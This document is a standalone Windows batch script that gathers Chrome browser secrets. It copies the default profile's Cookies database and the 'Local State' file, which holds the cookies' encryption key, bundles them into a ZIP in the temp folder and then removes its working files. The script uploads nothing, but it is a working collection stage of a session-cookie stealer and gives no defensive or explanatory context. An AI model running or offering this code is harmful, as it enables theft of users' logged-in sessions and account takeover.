@echo off
setlocal

set "chrome_dir=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network"
set "local_state_file=%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
set "output_file=%tmp%\output.zip"

if not exist "%chrome_dir%" (
    echo Chrome user data directory not found.
    exit /b
)

if not exist "%local_state_file%" (
    echo Local State file not found.
    exit /b
)

if exist "%output_file%" (
    del "%output_file%"
)

echo Copying files to temporary folder...

:: Create temporary folder
set "temp_folder=%tmp%\chrome_temp"
md "%temp_folder%"

:: Copy the Cookies file to temporary folder
copy "%chrome_dir%\Cookies" "%temp_folder%" >nul

:: Copy the Local State file to temporary folder
copy "%local_state_file%" "%temp_folder%" >nul

:: Create the ZIP file using PowerShell
powershell -noprofile -command "Compress-Archive -Path '%temp_folder%\*' -DestinationPath '%output_file%'"

echo ZIP file created: %output_file%

echo Cleaning up...

:: Delete the temporary folder
rd /s /q "%temp_folder%"

echo Cleanup completed.

exit /b
